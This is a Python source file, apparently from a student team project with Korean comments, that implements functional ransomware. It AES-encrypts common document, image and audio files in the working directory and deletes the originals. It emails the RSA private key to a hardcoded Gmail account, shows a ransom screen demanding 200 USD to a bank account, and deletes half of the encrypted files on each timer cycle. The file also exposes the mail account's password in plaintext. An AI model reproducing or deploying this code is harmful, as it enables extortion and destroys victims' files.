from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto import Random  # RSA 키 생성시 필요
from Crypto.Cipher import PKCS1_OAEP  # RSA 최신버전(보안더좋음)
import os
import threading
from time import sleep

# mail 라이브러리
import smtplib
import uuid
import poplib
from email.mime.text import MIMEText

# gui 라이브러리
import tkinter
from testFile import thanos

iv = os.urandom(16)
'''
1124 수정사항
클래스 이름 대문자로 시작해서 MyTk, Realmain 카멜식
함수 이름은 소문자로 시작해서 카멜식
변수 이름은 소문자로 시작해서 언더바(_)를 사용하여 나타냄
'''


'''
1125 수정사항 : <메일 전송/수신 시퀀스 추가>

(1)테스트 방법 :
gui 창이 뜨고 나서 구글에 secureantdd@gmail.com / antdd1234 로 로그인 한 후
자신의 mac 주소로 가장 최근에 온 메일의 private key를 input에 입력하면 => 복호화 성공

(2)메일 전송 : run() 시작 부분
 - 라이브러리 : stmplib 
 - rsa private 키를 생성한 후, gmail서버로 전송함
 - 전송 성공시 암호화 진행
 - 메일 : secureantdd@gmail.com / antdd1234

(3)메일 수신 : checkpassword()
 - 라이브러리 : poplib
 - 키를 입력받음 =>  gmail 의 리스트를 받아옴 => 사용자의 맥 주소와 일치하는 제목의 메일찾음
   메일 찾을 시 메일 내용(private key)와 입력받은 키를 비교 
   => 키가 일치할 경우 : 복호화진행 후 final gui 출력
   => 키가 일치하지 않을 경우 : 아무일 없었던 듯이 다시 진행됨
 - 메일의 리스트를 받아올 때는 "오래된 순" 으로 받아와 비교하므로
   메일 수가 많을 수록 오버헤드 커짐! => 주기적으로 삭제하기
'''


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
class MyTk:
    def __init__(self, parent=None):
        self.parent = parent
        self.pw = ""
        self.window = tkinter.Tk()
        self.window.title("ransomware")
        self.window.state('zoomed')  # maximize the window
        self.window.configure(background="black")

        self.l_text = tkinter.Label(self.window,
                                    text="\nYour computer files have been encrypted.\nYour photos, documents, etc...\nBut, don't worry! I have not deleted them yet :D"
                                         "\nYou have some time to pay 200USD in this accoutn(KB 786102-00-040854) to get the decryption key\n"
                                         "Every hour half of all files will be deleted.\n",
                                    fg="red", bg="black", font='Helvetica 14 bold')
        self.l_text.pack()

        self.l_timer = tkinter.Label(self.window, text="타이머 시작", fg="red", bg="black", font='Helvetica 14 bold')
        self.l_timer.pack()

        self.l_input = tkinter.Label(self.window,
                                     text="\npassword:",
                                     fg="red", bg="black", font='Helvetica 14 bold')
        self.l_input.pack()

        self.password = tkinter.Entry(self.window)
        self.password.pack()

        self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit,disabledforeground='red')
        self.pwbutton.pack()

        self.thanos = tkinter.PhotoImage(file="../ui/face.png")
        self.l_thanos = tkinter.Label(self.window, image=self.thanos, borderwidth=0, compound="center",
                                      highlightthickness=0)
        self.l_thanos.pack()

    def keySubmit(self):
        # input 창이나 pwbutton을 destroy 할 필요는 없다고 생각함
        # 틀린 시도를 해도 그냥 그대로 두어도 된다고 저번 회의때 얘기했었으니까!
        self.pw = str(self.password.get())

        self.l_input.config(text=" The keys are being checked ... ")  # 이거 왜 안뜨는거지..?
        self.pwbutton.config(state='disabled')

        self.parent and self.parent.checkPassword(self.pw)

        self.pwbutton.config(state='normal')
        self.l_input.config(text=" It's the wrong key.")


    def imageChange(self):
        # gif 출력
        self.l_thanos.destroy()
        self.l_thanos = thanos.AnimatedGIF(self.window, "../ui/thanos1.gif")  ##self.window로 수정
        self.l_thanos.pack()
        # 다시 타노스얼굴 사진
        sleep(2)
        self.l_thanos.destroy()
        self.l_thanos = tkinter.Label(self.window, image=self.thanos)  ##self.window로 수정 #self.thanos로 수정
        self.l_thanos.pack()

    def finalGui(self):  # 마지막 gui 올바른 키를 입력했을 때 GUI
        # window 내용 삭제
        self.l_timer.destroy()
        self.l_input.destroy()
        self.password.destroy()
        self.pwbutton.destroy()
        self.l_thanos.destroy()

        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')

        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
        self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
        self.l_final.pack()

        #self.window.mainloop()

        #sleep(50)
        #self.window.destroy()

        # 알아서 destory 안되는듯

    def allRemovePrint(self):
        self.l_thanos.pack_forget()
        l_allremove = tkinter.Label(self.window, text="\n\nYour files are all deleted.\n\n",
                                    fg="red", bg="black", font='Helvetica 16 bold')
        l_allremove.pack()
        sleep(3)
        self.listwindow.destroy()
        self.window.destroy()

    ###


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
def startTimer(gui, path, ext=None):
    sleep(1)
    print("타이머를 시작합니다")

    antdd_filelist = []

    #print("os.listdir(): \n", os.listdir())
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)):
            if name.endswith('antdd'):
                antdd_filelist.append(name)
            else:
                continue

    if len(antdd_filelist) == 0:
        print("파일이 존재하지 않습니다")
        gui.allRemovePrint()
        return

    # gui/ 삭제될 파일 리스트 출력
    # gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
    # 지운 파일 출력 #새창으로 띄우기
    gui.listWindow = tkinter.Toplevel(gui.window)
    gui.listWindow.title('암호화된 파일 리스트(남은 파일 리스트)')
    gui.listWindow.geometry("800x400")
    gui.listWindow.configure(background="black")
    gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['[' + x + ']' for x in antdd_filelist]),
                             background="black", fg="red",
                             font='Helvetica 14 bold')
    gui.listWindow.lift()
    gui.list.pack()
    ###
    #print("[" + ",".join(antdd_filelist) + "]")

    clock(gui, 300, antdd_filelist)



# 타이머를 출력해주는 함수
def clock(gui, c, antdd_filelist):
    c -= 1

    # 0초가 되면!
    if c == -2:
        # 파일 삭제를 시작함
        removeFiles(gui, antdd_filelist)
        return

    # gui의 타이머 label 을 갱신!
    gui.l_timer.config(text=str(c + 1))

    # 자기 자신 호출
    threading.Timer(1, clock, [gui, c, antdd_filelist]).start()


def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
    gui.l_thanos.destroy()
    gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
    gui.l_thanos.pack()

    sleep(2)

    # 파일이 2개 이상일 경우
    if (len(remove_filelist) >= 2):
        n = 0
        if (len(remove_filelist) % 2 == 0):
            n = round(len(remove_filelist) / 2)  # 정수로 변환
            print("지울 파일 개수: ", n)
        else:
            n = round(len(remove_filelist) / 2) - 1
            print("지울 파일 개수: ", n)

        for i in range(n):
            print(remove_filelist[i])
            os.remove(remove_filelist[i])
        print("파일 중 절반이 삭제되었습니다.")

    # 파일이 1개 남았을 경우
    elif (len(remove_filelist) == 1):
        os.remove(remove_filelist[0])
        print("더 이상 삭제할 파일이 없습니다")
        gui.listWindow.destroy()
        gui.allRemovePrint()

    gui.l_thanos.pack_forget()
    gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos, borderwidth=0, compound="center", highlightthickness=0)
    gui.l_thanos.pack()

    # 창 띄운 거 닫음
    gui.listWindow.destroy()

    # 다시 타이머함수 시작!
    startTimer(gui, os.getcwd())


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수

def enc(key, cipher, in_filename, out_filename=None):
    ciphertext = cipher.encrypt(key)  # 128비트
    mode = AES.MODE_CBC

    if not out_filename:
        out_filename = in_filename + '.antdd'

    with open(in_filename, 'rb') as infile:
        data = infile.read()
        size_of_data = len(data)
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length

        with open(out_filename, 'wb') as outfile:
            pass

        with open(out_filename, 'ab') as outfile:  # 이어쓰기 모드
            # RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
            outfile.write(b'0' * (64832 - len(str(size_of_data))) + str(size_of_data).encode())

            # RSA : 암호화된 AES 키를 넣어줌 (128바이트)
            outfile.write(ciphertext)
            encryptor = AES.new(key, mode, iv)
            e_data = encryptor.encrypt(data)
            outfile.write(e_data)


def dec(cipher, in_filename, out_filename=None):
    mode = AES.MODE_CBC

    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        e_data = infile.read()

        # RSA : 파일의 크기와 암호화된 AES 키 추출
        size_of_data = int(e_data[:64832].lstrip(b'0').decode())
        aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키

        # RSA : 암호화된 진짜 원본 데이터 추출
        e_data = e_data[64960:]

        # RSA : 추출한 AES 키 복호화
        aes_key_dec = cipher.decrypt(aes_key_enc)

        with open(out_filename, 'wb') as outfile:
            decryptor = AES.new(aes_key_dec, mode, iv)
            d_data = decryptor.decrypt(e_data)
            d_data = d_data[:size_of_data]
            outfile.write(d_data)


# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////메인함수

class RealMain:

    def __init__(self):
        self.key = os.urandom(16)

        # Mac 주소
        self.UUID = uuid.getnode()
        print("\n내 pc의 mac 주소(메일 제목이 됨) : UUID=", self.UUID, '\n')

        # RSA : 키, 싸이퍼 생성
        self.random_generator = Random.new().read
        self.rsa_key = RSA.generate(1024, self.random_generator)  # 키 정보 객체
        self.public_key = self.rsa_key.publickey().export_key()  # 공개키
        self.private_key = self.rsa_key.export_key()  # 비밀키

        self.test_input_key = os.urandom(16)  # gui에서 잘 받아오는지 확인하기 위한 변수

        self.myGui = MyTk(parent=self)  # 자기자신에 대한 레퍼런스를 가지는 gui 객체 생성

    # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수

    ##! 파일 리스팅함수 약간 수정
    def encListFiles(self, path):
        filelist = []
        extlist = \
            ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
             'jpg', 'jpeg', 'png', 'gif',
             'mp3', 'wav', 'wma',
             'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
        print("os.listdir(): \n", os.listdir())
        for name in os.listdir(path):
            if os.path.isfile(os.path.join(path, name)):
                for i in extlist:
                    if name.endswith(i):
                        filelist.append(name)
                    else:
                        continue

        print("enc_filelist: \n", filelist)
        return filelist

    def decListFiles(self, path):
        filelist = []
        for name in os.listdir(path):
            if name.endswith(".antdd"):
                filelist.append(name)
            else:
                continue
        print("dec_filelist: \n", filelist)
        return filelist
    ##! 여기까지

    # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////실제로 실행되는 함수
    def run(self):

        #print("공개키는 : ", self.public_key)
        #print("비밀키는 : ", self.private_key)

        # smtp 로그인 후 비밀키 전송
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.ehlo()  # say Hello
        smtp.starttls()  # TLS 사용시 필요
        smtp.login('secureantdd@gmail.com', 'antdd1234')  # 확인은 이 계정에서!

        msg = MIMEText(self.private_key.decode())  # RSA개인키 를 메세지로 전송함
        msg['Subject'] = str(self.UUID) # 사용자의 Mac 주소를 제목으로 전송
        msg['To'] = 'secureantdd@gmail.com'
        smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())

        smtp.quit()
        print('\n생성된 private key 를 메일로 보내기 성공\n')

        enc_targetlist = self.encListFiles(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.

        for enc_target in enc_targetlist:
            if enc_target.split('.')[-1] == 'antdd':
                continue
            enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target,
                out_filename=None)
            os.remove(enc_target)

        print("\n암호화 성공\n")

        th1 = threading.Thread(target=startTimer, args=[self.myGui, os.getcwd()])
        th1.daemon = True
        th1.start()

        self.myGui.window.mainloop()

    # ///////////////////////////////////////////////////////////////////////////////////////////////////////////////// 입력 패스워드 확인 함수
    def checkPassword(self, gui_input=None):
        print("\ngui로부터 입력한 pw: ", gui_input)

        # mail 확인
        print("메일 읽기 시작")

        #서버와 연동/ 로그인
        SERVER = "pop.gmail.com"
        server = poplib.POP3_SSL(SERVER)
        server.user('secureantdd@gmail.com')
        server.pass_('antdd1234')

        # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석!
        for i in range(len(server.list()[1])):
            msg = server.retr(i + 1)[1]
            text = b'\n'.join(msg).decode() # 메일의 전체 내용을 읽어옴
            idx = text.find('Subject:')
            text = text[idx + 9:]
            uuid = text[: text.find('\n')] # 메일의 수신자(mac 주소) 를 가져온다
            key = text[42:] # 메일에 들어있는 해당 주소의 private key

            # 만약 같은 주소의 사용자에게 온 메일이 있다면
            if uuid == str(self.UUID):
                # 보기 좋게 출력 한것. 실제로는 주소 당 하나의 메일이므로 삭제할 print 문
                print(i + 1, "번째 메일입니다")

                #만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                if key.strip()==gui_input.strip():
                    # 해당 메일 삭제
                    server.dele(i+1)
                    server.quit()

                    ##! 복호화 및 타겟파일 삭제
                    dec_targetlist = self.decListFiles(os.getcwd())
                    for dec_target in dec_targetlist:  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
                        dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                        os.remove(dec_target)
                    ##! 여기까지
                    self.myGui.finalGui()
                    print("복호화 성공!")
                    # auto_remove 호출
            else:
                print("\nself.test_input_key!=input")



if __name__ == "__main__":

    # 테스트용 파일 생성하기...(복붙너무귀찮아서...)
    for i in range(5):
        with open("test" + str(i) + '.txt', 'wb') as testfile:
            testfile.write('테스트입니다'.encode())

    r = RealMain()
    r.run()